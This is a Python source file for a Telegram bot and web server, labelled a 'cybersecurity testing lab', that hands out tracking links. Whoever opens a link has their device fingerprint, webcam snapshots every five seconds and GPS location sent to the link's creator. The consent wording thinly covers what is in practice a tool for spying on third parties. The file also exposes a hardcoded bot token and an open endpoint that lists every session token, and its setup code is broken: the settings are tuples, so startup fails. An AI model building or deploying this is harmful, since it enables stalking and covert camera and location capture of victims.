#!/usr/bin/env python3
# main.py
import logging
import os
import uuid
import asyncio
import base64
import json
from io import BytesIO
from datetime import datetime
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes
)

# ---------------- LOG ----------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------------- ENV ----------------
BOT_TOKEN = ("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = ("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')

if not BOT_TOKEN or BOT_TOKEN == "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA":
    logger.error("BOT_TOKEN is required! Please set it in environment variables.")
    exit(1)

# ---------------- GLOBAL STATE ----------------
USER_TOKENS = {}  # token -> telegram_id
ACTIVE_SESSIONS = {}  # token -> session data

# ---------------- Telegram Handlers ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send unique tracking link to user with consent information."""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Anonymous"
    
    # Generate secure token
    token = str(uuid.uuid4())
    USER_TOKENS[token] = {
        'user_id': user_id,
        'username': username,
        'created_at': datetime.now(),
        'active': True
    }
    ACTIVE_SESSIONS[token] = {
        'data_collected': [],
        'images': [],
        'consent_given': False
    }
    
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"

    msg = (
        "🔒 **CYBERSECURITY TESTING LAB** 🔒\n\n"
        "⚠️  **IMPORTANT: CONSENT REQUIRED**\n"
        "This tool is designed for authorized security testing only.\n\n"
        "📋 **What will be collected (with consent):**\n"
        "• Device information (OS, browser, screen resolution)\n"
        "• Network information (time zone, language)\n"
        "• Camera feed (only when consent is given)\n"
        "• Location data (only when consent is given)\n\n"
        f"🔗 **Test Link:**\n`{link}`\n\n"
        "🔐 **Privacy Notice:**\n"
        "• All data is encrypted during transmission\n"
        "• Data is automatically deleted after 24 hours\n"
        "• Only authorized personnel can access data\n"
        "• No data is stored permanently\n\n"
        "⚠️ **Legal Disclaimer:**\n"
        "Use only on systems you own or have explicit permission to test"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------------- Web Server: /track ----------------
async def track_page(request):
    token = request.query.get('token')
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Invalid or expired token.", status=403)

    # Consent-first tracking page
    html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Security Test Consent</title>
  <style>
    body {{
      background-color: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }}
    .container {{
      max-width: 600px;
      background: #161b22;
      border-radius: 10px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    }}
    h1 {{ color: #f85149; margin-bottom: 20px; }}
    .consent-item {{
      background: #0d1117;
      padding: 15px;
      margin: 10px 0;
      border-radius: 5px;
      border-left: 3px solid #f85149;
    }}
    .btn {{
      background: #238636;
      color: white;
      border: none;
      padding: 12px 25px;
      margin: 10px 5px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }}
    .btn:hover {{ background: #2ea043; }}
    .btn-danger {{ background: #da3633; }}
    .btn-danger:hover {{ background: #f85149; }}
    .status {{ margin: 20px 0; padding: 15px; border-radius: 5px; }}
    .success {{ background: #1f6feb; }}
    .warning {{ background: #d29922; }}
  </style>
</head>
<body>
  <div class="container">
    <h1>🔒 Security Testing Consent</h1>
    
    <p>This page will collect the following information:</p>
    
    <div class="consent-item">
      <strong>Device Information</strong><br>
      OS, Browser, Screen Resolution, Hardware Specs
    </div>
    
    <div class="consent-item">
      <strong>Network Information</strong><br>
      Time Zone, Language Settings, IP Location
    </div>
    
    <div class="consent-item">
      <strong>Camera Access</strong><br>
      Live video feed (only with consent)
    </div>
    
    <div class="consent-item">
      <strong>Location Data</strong><br>
      GPS coordinates (only with consent)
    </div>
    
    <p><strong>Do you consent to this data collection for security testing purposes?</strong></p>
    
    <button class="btn" onclick="giveConsent()">Yes, I Consent</button>
    <button class="btn btn-danger" onclick="denyConsent()">No, I Do Not Consent</button>
    
    <div id="status" class="status" style="display: none;"></div>
  </div>

  <script>
    async function giveConsent() {{
      document.getElementById('status').innerHTML = '✅ Consent given. Collecting data...';
      document.getElementById('status').className = 'status success';
      document.getElementById('status').style.display = 'block';
      
      // Mark consent in session
      localStorage.setItem('consent', 'true');
      
      // Start data collection
      await collectData();
    }}
    
    function denyConsent() {{
      document.getElementById('status').innerHTML = '❌ Consent denied. No data collected.';
      document.getElementById('status').className = 'status warning';
      document.getElementById('status').style.display = 'block';
      
      // Mark consent denied
      localStorage.setItem('consent', 'false');
    }}
    
    async function collectData() {{
      // Basic device info
      const data = {{
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages || [navigator.language],
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        os: getOS(),
        browser: getBrowser(),
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown',
        deviceType: getDeviceType(),
        consent: localStorage.getItem('consent') === 'true'
      }};
      
      // Send data to server
      await fetch('/submit', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ token: '{token}', ...data }})
      }});
      
      // If consent given, start camera capture
      if (data.consent) {{
        startCameraCapture('{token}');
        startLocationCapture('{token}');
      }}
    }}
    
    function getOS() {{
      const userAgent = navigator.userAgent;
      if (userAgent.includes('Win')) return 'Windows';
      if (userAgent.includes('Mac')) return 'macOS';
      if (userAgent.includes('Linux')) return 'Linux';
      if (userAgent.includes('Android')) return 'Android';
      if (/iPhone|iPad|iPod/.test(userAgent)) return 'iOS';
      return 'Unknown';
    }}
    
    function getBrowser() {{
      const userAgent = navigator.userAgent;
      if (userAgent.includes('Chrome')) return 'Chrome';
      if (userAgent.includes('Firefox')) return 'Firefox';
      if (userAgent.includes('Safari')) return 'Safari';
      if (userAgent.includes('Edge')) return 'Edge';
      return 'Unknown';
    }}
    
    function getDeviceType() {{
      const width = screen.width;
      const height = screen.height;
      const ratio = window.devicePixelRatio || 1;
      
      if (width * ratio <= 768) return 'Mobile';
      if (width * ratio <= 1024) return 'Tablet';
      return 'Desktop';
    }}
    
    async function startCameraCapture(token) {{
      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Capture image every 5 seconds
        setInterval(() => {{
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          const imageData = canvas.toDataURL('image/jpeg', 0.7);
          
          fetch('/upload_image', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ token: token, image: imageData }})
          }});
        }}, 5000);
      }} catch (e) {{
        console.log('Camera access denied:', e);
      }}
    }}
    
    async function startLocationCapture(token) {{
      if (!navigator.geolocation) return;
      
      navigator.geolocation.getCurrentPosition(
        (position) => {{
          const locationData = {{
            token: token,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
          }};
          
          fetch('/submit_location', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(locationData)
          }});
        }},
        (error) => {{
          console.log('Location access denied:', error);
        }}
      );
    }}
  </script>
</body>
</html>
"""
    return web.Response(text=html, content_type='text/html')

# ---------------- Web Server: /submit ----------------
async def submit_data(request):
    try:
        data = await request.json()
        token = data.get('token')
        
        user_info = USER_TOKENS.get(token)
        if not user_info:
            return web.json_response({"error": "Invalid token"}, status=400)

        # Add to session data
        session = ACTIVE_SESSIONS.get(token, {})
        session['data_collected'].append(data)
        ACTIVE_SESSIONS[token] = session

        # Format message for Telegram
        lines = [
            "🔒 *SECURITY TEST RESULTS*",
            f"👤 User: `{user_info['username']}` (`{user_info['user_id']}`)",
            f"🕒 Timestamp: `{data.get('timestamp', 'Unknown')}`",
            f"🌍 Timezone: `{data.get('timezone', 'Unknown')}` (UTC{data.get('utcOffset', '?')})",
            f"💬 Languages: `{', '.join(data.get('languages', ['Unknown']))}`",
            f"💻 OS: `{data.get('os', 'Unknown')}` | Browser: `{data.get('browser', 'Unknown')}`",
            f"📱 Device: `{data.get('deviceType', 'Unknown')}` | Platform: `{data.get('platform', '-')}`",
            f"🧠 CPU: `{data.get('cpuCores', '?')} cores` | RAM: `{data.get('ram', '?')}`",
            f"📺 Screen: `{data.get('screen', '?')}` | Viewport: `{data.get('viewport', '?')}`",
            f"🔍 Consent: `{'✅ Given' if data.get('consent') else '❌ Not Given'}`",
            f"🔍 UA: `{data.get('userAgent', 'Unknown')}`"
        ]
        
        message = '\n'.join(lines)
        await request.app['bot'].send_message(
            chat_id=user_info['user_id'], 
            text=message,
            parse_mode='Markdown'
        )
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception(f"[SUBMIT ERROR] {e}")
        return web.json_response({"error": str(e)}, status=500)

# ---------------- Web Server: /submit_location ----------------
async def submit_location(request):
    try:
        data = await request.json()
        token = data.get('token')
        
        user_info = USER_TOKENS.get(token)
        if not user_info:
            return web.json_response({"error": "Invalid token"}, status=400)

        # Add to session data
        session = ACTIVE_SESSIONS.get(token, {})
        session['location'] = data
        ACTIVE_SESSIONS[token] = session

        # Send location to Telegram
        message = (
            f"📍 *LOCATION DATA*\n"
            f"👤 User: `{user_info['username']}`\n"
            f"🕒 Time: `{data.get('timestamp', 'Unknown')}`\n"
            f"🌍 Coordinates: `{data.get('latitude', '?')}, {data.get('longitude', '?')}`\n"
            f"🎯 Accuracy: `{data.get('accuracy', '?')} meters`"
        )
        
        await request.app['bot'].send_message(
            chat_id=user_info['user_id'], 
            text=message,
            parse_mode='Markdown'
        )
        
        # Send actual location on map
        await request.app['bot'].send_location(
            chat_id=user_info['user_id'],
            latitude=data.get('latitude'),
            longitude=data.get('longitude')
        )
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception(f"[LOCATION ERROR] {e}")
        return web.json_response({"error": str(e)}, status=500)

# ---------------- Web Server: /upload_image ----------------
async def upload_image(request):
    try:
        data = await request.json()
        token = data.get('token')
        image_data = data.get('image')

        user_info = USER_TOKENS.get(token)
        if not user_info:
            return web.json_response({"error": "Invalid token"}, status=400)

        if not image_data:
            return web.json_response({"error": "No image data"}, status=400)

        # Remove data URL prefix if present
        if image_data.startswith('data:image'):
            image_data = image_data.split(',', 1)[1]

        # Decode and send image
        image_bytes = base64.b64decode(image_data)
        image_io = BytesIO(image_bytes)
        image_io.name = "security_cam.jpg"

        # Add to session data
        session = ACTIVE_SESSIONS.get(token, {})
        session['images'].append(datetime.now().isoformat())
        ACTIVE_SESSIONS[token] = session

        await request.app['bot'].send_photo(
            chat_id=user_info['user_id'], 
            photo=InputFile(image_io),
            caption="📸 *Security Camera Capture*",
            parse_mode='Markdown'
        )
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception("[IMAGE UPLOAD ERROR]")
        return web.json_response({"error": str(e)}, status=500)

# ---------------- Web Server: /status ----------------
async def status_page(request):
    """Return current status of active sessions."""
    active_count = len([t for t, u in USER_TOKENS.items() if u['active']])
    total_sessions = len(USER_TOKENS)
    
    status_info = {
        "active_sessions": active_count,
        "total_sessions": total_sessions,
        "server_time": datetime.now().isoformat(),
        "tokens_issued": list(USER_TOKENS.keys())
    }
    
    return web.json_response(status_info)

# ---------------- Web Server Starter ----------------
async def start_web_server(bot):
    app = web.Application()
    app['bot'] = bot
    app.router.add_get('/track', track_page)
    app.router.add_post('/submit', submit_data)
    app.router.add_post('/submit_location', submit_location)
    app.router.add_post('/upload_image', upload_image)
    app.router.add_get('/status', status_page)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8000"))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web server started at http://0.0.0.0:{port}")

# ---------------- Startup ----------------
async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

# ---------------- Cleanup Task ----------------
async def cleanup_task():
    """Clean up expired sessions every hour."""
    while True:
        try:
            now = datetime.now()
            expired_tokens = []
            
            for token, user_info in USER_TOKENS.items():
                # Expire tokens after 24 hours
                if (now - user_info['created_at']).total_seconds() > 86400:
                    expired_tokens.append(token)
            
            for token in expired_tokens:
                USER_TOKENS.pop(token, None)
                ACTIVE_SESSIONS.pop(token, None)
            
            logger.info(f"Cleaned up {len(expired_tokens)} expired sessions")
            await asyncio.sleep(3600)  # Every hour
        except Exception as e:
            logger.exception(f"Cleanup error: {e}")
            await asyncio.sleep(3600)

# ---------------- Main ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    
    # Start cleanup task
    asyncio.create_task(cleanup_task())
    
    logger.info("🚀 Cybersecurity Testing Lab started.")
    app.run_polling()

if __name__ == "__main__":
    main()
